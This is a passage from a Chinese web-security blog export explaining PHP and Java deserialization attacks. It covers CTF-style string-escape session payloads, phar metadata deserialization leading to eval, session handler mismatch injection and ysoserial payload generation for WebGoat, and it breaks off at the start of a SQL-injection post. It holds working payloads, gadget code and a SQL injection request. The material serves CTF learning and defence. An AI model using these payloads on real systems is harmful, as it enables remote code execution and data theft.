flag存在于 该文件当中。那我们需要想办法读取到该文件； 当 $function == &#39;show_image&#39; 时，首先对 $serialize_info 进行反序列化，然后对其中 $userinfo[&#39;img&#39;] 进行base64解码之后，使用 file_get_contents 读取出文件；而 $serialize_info 正是我们所传入的 $function 在 进行 filter() 函数过滤之后的结果； 手动添加以下代码，输出查看序列化之后的内容： 该 base64 编码 Z3Vlc3RfaW1nLnBuZw== 即是 guest_img.png 我们需要使 键 img 为 d0g3_f1ag.php 文件加密之后的内容；ZDBnM19mMWFnLnBocA== 是 d0g3_f1ag.php 构造 123456post 传参： _SESSION[user]=a&amp;_SESSION[function]=p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;# 序列化后 string(128) &quot;a:3:&#123;s:4:&quot;user&quot;;s:1:&quot;a&quot;;s:8:&quot;function&quot;;s:42:&quot;p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; 以上内容如果进行反序列化，将会报错，原因： 前面 a:3: 表示 SESSION 含有三个键值对，它会一直向后取直到取到三个为止；第一个 user 正常取值；第二个 function 由于长度是 42 ，将会取到的值是 p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; ；所以仍旧会取到第三个 img 值为 Z3Vlc3RfaW1nLnBuZw== ；但是进行反序列化之后，我们希望得到的是第三个 img 被挤掉，以我们在 function 中传递的 img 作为新的 img ；所以实际上如果 s:42:&quot;p&quot; 是 s:1:&quot;p&quot; 就好了。 利用过滤函数使字符减少来增大长度，吞掉后面部分内容。 测试： 123_SESSION[user]=flag&amp;_SESSION[function]=b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;# 返回 string(127) &quot;a:3:&#123;s:4:&quot;user&quot;;s:4:&quot;&quot;;s:8:&quot;function&quot;;s:42:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; &quot;;s:8:&quot;function&quot;;s:42:&quot;b 长度是 24，构造 user 值是 6个 flag ，即长度是 24，将会把 &quot;;s:8:&quot;function&quot;;s:42:&quot;b吞掉，当作 user 的值；而 img 即为我们的 d0g3_f1ag.php；再手动补充一个键值对（随意）满足 _SESSION 的三个键；而位于最后的默认的 guest_img.png 将被挤掉，不会起作用； 注意：由于吞掉了一个键值对，我们把 img 作为第二个键名存在了，但 SESSION 本身是有三个键值对的，如果我们不手动添加一个键值对的话，最后存在的原本的 img 也将会被解析，起不到挤掉的作用。 payload1 — 键值逃逸： 123_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125;# 序列化后 string(146) &quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:60:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; 对 /d0g3_fllllllag 进行 base64编码为 L2QwZzNfZmxsbGxsbGFn，长度是 20； 构造以下内容： 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=b&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125; &quot;;s:49: 长度是 7，构造 键名为 flagphp，将其吞掉作为一个新的键名，值是 db；第二个键名 img 即是我们所构造的；由于 a:2:，因此一共只会取两个键名，所以最后的 img 被挤掉了。 payload2 — 键名逃逸： 123_SESSION[flagphp]=;s:2:&quot;db&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;# 序列化后 string(108) &quot;a:2:&#123;s:7:&quot;&quot;;s:49:&quot;;s:2:&quot;db&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; 函数总结： 12345678910111213141516171819202122implode() 把数组元素组合为一个字符串后返回：&lt;?php$arr = array(&#x27;Hello&#x27;,&#x27;World!&#x27;,&#x27;Beautiful&#x27;,&#x27;Day!&#x27;);echo implode(&quot; &quot;,$arr);?&gt; # 返回 Hello World! Beautiful Day! unset() 销毁指定的变量 extract() 函数从数组中将变量导入到当前的符号表&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\\$a = $a; \\$b = $b; \\$c = $c&quot;;?&gt; # 返回 $a = Cat; $b = Dog; $c = Horse 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。 三、phar 序列化https://www.cnblogs.com/zzjdbk/p/13030571.html https://blog.csdn.net/qq975353472/article/details/109668373 https://xz.aliyun.com/t/2715 一般利用反序列化漏洞，一般都是借助unserialize()函数。 新型攻击方式：利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。 特点：不使用 unserialize()函数 利用条件： 能够上传 .phar 文件至服务器 存在可用的 魔术方法 作为跳板 文件操作函数的参数可控 / : phar 等特殊字符未被过滤 受影响函数列表： 原理参考 https://blog.zsxsoft.com/post/38 3.1 phar 介绍PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，会以序列化的形式存储用户自定义的 meta-data ，当受影响的文件操作函数调用 phar 文件时，会自动反序列化 meta-data 中的内容。 在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。用来将多个PHP文件打包为一个文件.可以和tar zip相互转化。 版本 &gt;5.2 php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。 php中一些常见的流包装器如下： 123456789101112file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 3.2 phar 文件结构 a stub phar 文件的标志，前面内容不限，必须以 __HALT_COMPILER();?&gt; 结尾，否则 phar 扩展将无法识别该文件是 phar文件 1xxx&lt;?php xxx;__HALT_COMPILER();?&gt; a manifest describing the contents Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点。 the file contents 所被压缩的文件内容，在无特殊要求的情况下，该内容可随意写 a signature for verifying Phar integrity 签名格式，位于末尾 3.3 测试：phar 文件的构造 条件：php.ini 编写 生成 .phar 文件 1234567891011121314&lt;?php class Test&#123; &#125; $phar = new Phar(&quot;1.phar&quot;); //后缀必须为 .phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 设置 stub $o = new Test(); $o-&gt;data = &#x27;hacker123!&#x27;; $phar-&gt;setMetadata($o); //将自定义的 meta-data 存入 manifest $phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); //添加要压缩的文件 //签名将自动计算 $phar-&gt;stopBuffering();?&gt; 访问过后，会在当前目录下生成 1.phar 文件，打开，看其内容 发现，meta-data 是以序列化的形式存储的 那么，在哪里进行反序列化？ phar://协议读取文件 php 大部分的文件系统函数在通过 phar:// 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，经测试后，所受影响的函数有 1234567&lt;?phpclass Test&#123; function __destruct()&#123; echo $this-&gt;data; &#125;&#125;include(&#x27;phar://1.phar&#x27;);//phar:// 触发：进行反序列化 访问，成功触发了反序列化，得到 3.4 常见利用：文件上传+文件包含环境： 123upload_file.php # 后端检测文件上传,确保文件类型及后缀是 .gifupload_file.html #文件上传表单前端file_un.php #存在 file_exists() 以及 __destruct() 用以phar://伪协议读取文件内容 利用条件： 存在文件上传 存在 file_exists() fopen() file_get_contents() file() 等文件操作函数 phar:// 等字符未被过滤 upload_file.php 123456789101112131415161718192021&lt;?phpif (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123; echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;]; echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; &#125; else &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; &#125; &#125;else &#123; echo &quot;Invalid file,you can only upload gif&quot;; &#125; upload_file.html 123456&lt;body&gt;&lt;form action=&quot;http://localhost:8080/ctf/phar/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;&lt;/form&gt;&lt;/body&gt; file_un.php 1234567891011&lt;?phphighlihgt_file(__FILE__);$filename=$_GET[&#x27;filename&#x27;];class AnyClass&#123; var $output = &#x27;echo &quot;ok&quot;;&#x27;; function __destruct() &#123; eval($this -&gt; output); &#125;&#125;file_exists($filename); 题目： 生成 .phar 文件：phar.php 12345678910111213141516171819202122&lt;?php//highlihgt_file(__FILE__);$filename=$_GET[&#x27;filename&#x27;];class AnyClass&#123; var $output = &#x27;echo &quot;ok&quot;;&#x27;; function __destruct() &#123; eval($this -&gt; output); &#125;&#125;file_exists($filename); $phar = new Phar(&quot;hack.phar&quot;); //后缀必须为 .phar $phar-&gt;stopBuffering(); $phar-&gt;setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); // 设置 stub $phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); //添加要压缩的文件 $o = new AnyClass(); $o-&gt;output = &#x27;phpinfo();&#x27;; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest //签名2将自动计算 $phar-&gt;stopBuffering(); 访问，得到 hack.phar 将 hack.phar 后缀修改为 hack.gif 在 upload_file.html 里上传 然后我们进入 file_un.php 1?filename=phar://hack.gif 可以看到，命令成功执行 3.5 绕过姿势：过滤 phar 当题目环境限制 phar 不能出现在前面的字符里，即无法使用 phar:// 协议 ，可以使用 compress.bzip2://和compress.zlib://等绕过 1234compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt 当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。 1php://filter/read=convert.base64-encode/resource=phar://phar.phar GIF格式验证可以通过在文件头部添加GIF89a绕过 1231、$phar-&gt;setStub(“GIF89a”.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub2、生成一个phar.phar，修改后缀名为phar.gif 3.6 php-session 反序列化https://www.cnblogs.com/NPFS/p/13795170.html https://www.freebuf.com/news/202819.html https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral https://github.com/80vul/phpcodz/blob/master/research/pch-013.md 3.6.1 关于 php 中的 session 存储机制session 介绍： 在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。 当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 php 中的 session 存储相关匹配值： PHP 版本 &gt;= 5.4 中有关 session 的相关配置：php.ini 1234567891011121314151. session.upload_progress.enabled = on# enabled = on 表示 upload_progress 功能开启，即当浏览器向服务器上传一个文件时，php 会把此次文件上传的详细信息，如上传时间、上传进度等都储存在 session中2. session.upload_progress.cleanup = on# cleanup = on 当文件上传结束之后， oho 会立即将对应的 session 文件清空3. session.upload_progress.prefix = &quot;upload_progress_&quot;4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;# name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；# 重点：prefix+name将表示为session中的键名5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot;7. session.use_strict_mode=off # 表示我们对 Cookie 中的 session 是可控的 12345678910111. session.save_path=&quot;&quot; # 设置 session 的储存路径2. session.save_handler=&quot;&quot;# 设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)3. session.auto_start# boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动4. session.serialize_handler# string --定义用来序列化/反序列化的处理器名字。默认使用php php 版本为 5.4.45 的部分默认配置如下： 1234;session.save_path = &quot;/tmp&quot;session.save_handler = filessession.auto_start = 0session.serialize_handler = php session.serialize_handler = php 该选项是用来设置 session 的 序列化引擎 的，除了默认的 php 引擎之外，也存在其他的，不同的 引擎对应的 session 的存储方式不同。 其它存储引擎如下： php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 如果需要修改该引擎，须有手动添加代码 ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);，例如： 12&lt;?php ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;); session_start(); 下面我们仅仅讨论 php 引擎所引起的 反序列化。 php 中的 session 存储机制： php 中的 session 中的内容不是存在内存当中的，而是以文件的形式进行存储，存储方式是由配置项 session.save_handler 来进行确定的，默认以文件的方式存储。所存储的文件名是以 sess_sessionid 来进行命名的，文件的内容就是 session 值得序列化之后的内容。 例如：客户端的用户进行抓包，在 Cookie 字段中进行设置 PHPSESSION=test ，则 服务器上就将会创建一个文件 /tmp/sess_test 文件，用于存储 用户的 SESSIONS 信息。 测试：PHP 7.3.4 php 默认引擎下： 123&lt;?php session_start(); $_SESSION[&#x27;name&#x27;] = &#x27;test&#x27;; session 文件中其中，name 是键名，s:4:&quot;test&quot;; 是 serialize(&quot;test&quot;) 的结果。 php_serialize 引擎下： 123&lt;?php ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;); session_start(); $SESSION[&#x27;name&#x27;] = &#x27;test&#x27;; session 文件内容是 a:1:{s:4:”name”;s:4:”test”;}，其中 a:1 只要是使用 php_serialize 引擎都会加上的，然后使用 php_serialize 引擎将会把 session 中的键名和键值都进行反序列化。 在php_binary引擎下： 1234&lt;?php ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;); session_start();$_SESSION[&#x27;name&#x27;] = &#x27;test&#x27;; session 文件内容是 \u0004names:4:”test”; 由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是\u0004names:6:&quot;spoock&quot;;。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧) 3.6.2 php-session 序列化简单测试：利用原理序列化简单测试： 123456789101112&lt;?php class lover&#123; var $func = &quot;&quot;; function __construct()&#123; $this-&gt;func = &#x27;phpinfo()&#x27;; &#125; function __wakeup()&#123; eval($this-&gt;func); &#125;&#125;unserialize($_GET[&#x27;a&#x27;]);?&gt; 我们可以传入：?a=O:5:&quot;lover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo%20&quot;spoock&quot;;&quot;;&#125; 则将会在页面中输出 spoock 。 php session 反序列化构造： PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确的进行反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。 示例： 假如 题目本身是 php_serialize 的存储引擎，如果我们注入数据：a=|o:4:&quot;test&quot;:0:&#123;&#125; 则 其通过 php_serialize 的引擎处理过后，将会变成 a:1:&#123;s:1:&quot;a&quot;;a:16:&quot;|o:4:&quot;test&quot;:0:&#123;&#125;&quot;&#125; 随后 如果我们利用 php 的存储引擎来读取，那么经过解读之后将会理解为 ： &#123;s:1:&quot;a&quot;;a:16:&quot; 是键名，而 | 后面的就会被理解为一个对象的实例化注入。 测试 ： 1234567&lt;?php//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];echo &quot;&lt;pre&gt;&quot;;var_dump($_SESSION);echo &quot;&lt;/pre&gt;&quot;; 访问 ?a=|o:4:”test”:0:{} 此时 session 文件内容为 a:1:{s:1:”a”;a:16:”|o:4:”test”:0:{}”} 设置 ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); ，即使用 php 引擎读取，再次访问即可。 12345array(1) &#123; [&quot;a:1:&#123;s:1:&quot;a&quot;;a:16:&quot;&quot;]=&gt; object(stdClass)#1 (0) &#123; &#125;&#125; 3.6.3 php-session 序列化实际利用必备知识： 选项 session.auto_start=On ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 关闭 。 选项 session.use_strict_mode=0 ，默认值是0即未启动时，用户可以自定义 session。 方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 /tmp/sess_flag 。这时用户并没有初始化 session ，php也照样自动初始化 session，而产生了一个键值，该键值由 ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name 一起组成，最终写入 sess_文件 li里。 linux 下，session文件一般的默认存储位置是 /tmp 或 /var/lib/php/session 避免 session.upload_progress.cleanup=on 的干扰 该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。 方法：条件竞争 当 session.auto_start＝On 时： 如果 session.auto_start＝On ，就会自动注册 session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此我们需要 在脚本中设置 序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话，然后再设置需要的序列化处理器，那么第一次我们所使用的就是我们自己设置的存储器，而第二次执行时，系统仍会自动调用 session_start() 函数注册会话，这时所使用的就是默认的存储引擎了。 所以，如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码： 已知：默认的存储引擎是 php 1234567&lt;?phpif (ini_get(&#x27;session.auto_start&#x27;)) &#123; session_destroy();&#125;ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;]; 第一次访问脚本 ，传入参数 ?a=|O:8:&quot;stdClass&quot;:0:&#123;&#125;，脚本将会按照 php_serialize 处理数据，得到： 1a:1:&#123;s:1:&quot;a&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125; 第二次访问，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）。 当 session.auto_start＝Off 时： 两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码： 12345678910111213141516171819202122232425//foo1.php&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];//foo2.php&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);//or session.serialize_handler set to php in php.ini session_start();class a &#123; var $hi; function __wakeup() &#123; echo &#x27;hi&#x27;; &#125; function __destruct() &#123; echo $this-&gt;hi; &#125;&#125; 访问 foo1.php 提交数据 ?a=|O:1:”a”:1:{s:2:”hi”;s:7:”success”;} 1a:1:&#123;s:1:&quot;a&quot;;s:36:&quot;|O:1:&quot;a&quot;:1:&#123;s:2:&quot;hi&quot;;s:7:&quot;success&quot;;&#125;&quot;;&#125; 再访问 foo2.php ，成功 由于 访问 foo1 时，传入的数据将会使用 php_serialize 进行序列化，然后再访问 foo2 时，程序将会使用 php 引擎来反序列化 session 中是之举，从而实例化 a 对象，而执行其中的魔术方法。 补充： 为什么在 解析 session 文件时为什么在解析session文件时直接对’|’后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明： 当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量 3.6.4 CTF 题目速查 序列化后的结果是一串字符串。 反序列化会解开序列化的字符串生成相应类型的数据。 如下代码示例，img是一个数组，下标分别是one和two，对应的值分别是flag,test。 1234567891011121314151617&lt;?php$img[&#x27;one&#x27;] = &quot;flag&quot;;$img[&#x27;two&#x27;] = &quot;test&quot;;$a = serialize($img);var_dump($a);#输出: string(48) &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;$b = unserialize($a);var_dump($b);/*输出如下内容:array(2) &#123; [&quot;one&quot;]=&gt; string(4) &quot;flag&quot; [&quot;two&quot;]=&gt; string(4) &quot;test&quot;&#125;*/ 序列化部分: 经过serialize序列化后生成了相应的字符串: a:2:{s:3:”one”;s:4:”flag”;s:3:”two”;s:4:”test”;} a表示数组 , a:2中的2表示有两个键值，即对应的one、two两组键值对。 花括号中的s都表示string即字符串， s:后面的值分别是3、4、3、4,即对应的字符串长度，比如one长度是三，flag长度是4 反序列化部分: unserialize函数将字符串解序列化，我们用var_dump函数显示了他的详细信息。 可见解序列化后由变量$b，接收了img数组。 序列化中每个字母的表示 a array数组 b boolean判断类型 d double浮点数 i integer整数型 o common object 一般的对象 r reference引用类型 s string字符串类型 C custom object O class N null R pointer reference U unicode string 1234567891011__wakeup() //使用unserialize时触发 __sleep() //使用serialize时触发 __destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发 echo 对象; $text=$test+$对象； __invoke() //当尝试以调用函数的方式调用一个对象时，该方法会被自动调用 1.3 危害SQL注入 代码执行 目录遍历 四、JAVA 反序列化序列化：将对象的状态信息转换为可以存储或者传输的形式的过程。序列化期间，对象将其当前的状态写入到临时或持久型储存区。 反序列化：从储存区读取到数据，将其还原为对象 好处： 把对象的字节序列永久地保存到硬盘上，实现对象的持久化，通常存放在一个文件中； 利用序列化实现远程通信，即在网络上传递对象的字节序列。 实例理解 Web 服务器中的 Session 会话对象，当有10万用户并发访问，就有可能出现10万个 Session 对象，显然这种情况内存可能是吃不消的。 于是 Web 容器就会把一些 Session 先序列化，让他们离开内存空间，序列化到硬盘中，当需要调用时，再把保存在硬盘中的对象还原到内存中。 我们知道，当两个进程进行远程通信时，彼此可以发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。 同样的序列化与反序列化则实现了 进程通信间的对象传送，发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。 JDK 类库中序列化 API 1234//序列化:对参数指定的obj对象进行序列化，将字节序列写入到一个目标输出流中ObjectOutputStream类 writeObject()//反序列化:从一个源输入流中读取字节序列，把他们反序列化为一个对象，将其返回ObjectIntputStream类 readObject() 工具 https://github.com/frohoff/ysoserial/releases WebGoat https://github.com/WebGoat/WebGoat/releases 1234docker pull webgoat/webgoat-8.0docker imagesdocker run -p 8080:8080 -t webgoat/webgoat-8.0http://192.168.158.111:8080/WebGoat/login 4.1 WebGoat12rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l即序列化+base64加密 命令执行 + 反弹 shell(以免不会回显) 12#思路:以 执行 ipconfig 命令为例ipconfig --&gt; 序列化 --&gt; base64加密 --&gt; 最终转换成以rO0AB格式开头的字符串作为我们的payload 工具形成 payload 1java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-30099844c6-1.jar ysoserial.GeneratePayload Hibernatel calc.exe &gt; payload.bin 再将生成的 payload.bin 进行一个base64加密：使用python脚本 1234import base64c = open(&quot;payload.bin路径&quot;,&quot;rb&quot;).read()cc = base64.urlsafe_b64encode(c)open(&quot;payload.txt&quot;,&quot;wt&quot;,ecoding=&quot;utf-8&quot;).write(cc.decode()) 4.2 CTFHUB —- think_java1234567891011POST /common/test/sqlDict HTTP/1.1Host: challenge-516f101de06176a6.sandbox.ctfhub.com:10080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0dbName=myapp?a=&#x27; union select (select pwd from user)# SQL注入获取用户账号吗和密码 登陆成功 对方回显数据：一段 ro0AB开头的数据 先进行base64解密 使用serializationDumper工具进行解析反序列话的数据 java -jar SerializationDumper.jar base64 https://www.cnblogs.com/20175211lyz/p/11403397.html https://www.cnblogs.com/niceyoo/p/10596657.html","categories":[{"name":"WEB漏洞详解","slug":"WEB漏洞详解","permalink":"https://xizhi-future.github.io/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"}],"tags":[{"name":"序列化与反序列化","slug":"序列化与反序列化","permalink":"https://xizhi-future.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"xizhi-future"},{"title":"SQL注入全解","slug":"SQL 注入全解","date":"2021-10-07T10:07:52.000Z","updated":"2021-10-23T08:48:57.119Z","comments":true,"path":"2021/10/07/SQL 注入全解/","link":"","permalink":"https://xizhi-future.github.io/2021/10/07/SQL%20%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3/","excerpt":"","text":"[TOC] SQL 注入全解SQL 注入 详解 一、注入分类 注入点分类 数字型注入 字符型注入：单引号，双引号，加括号等等 提交方式分类 GET 方式注入 POST 方式注入 COOKIE 方式注入 HTTP 头部注入：XFF，UA，REFRERE 是否回显 联合查询 布尔盲注 报错注入 时间盲注 二次注入 堆叠查询（同时执行多条语句） 二、注入判断 工具扫描：网站漏扫工具，AWVS、AppScan、OWASP-ZAP、Nessus等 手动测试： 单双引号，括号，进行组合测试，看是否报错 对于数字型 ?id=3-1 ?id=2# 如果显示的是 ?id=2 时的正常页面，就说明我们所写的表达式进行了正确运算，可判断注入点是 数字型注入；如果返回不正常，则可能是非数字型注入。 对于字符型 ?id=2a ?id=2&#39;# Mysql 中，等号两边如果类型不一致，会发生强制类型转换。当数字与字符串进行比较时，首先先将字符串转换成数字，然后再进行比较。类似于 PHP 里面的 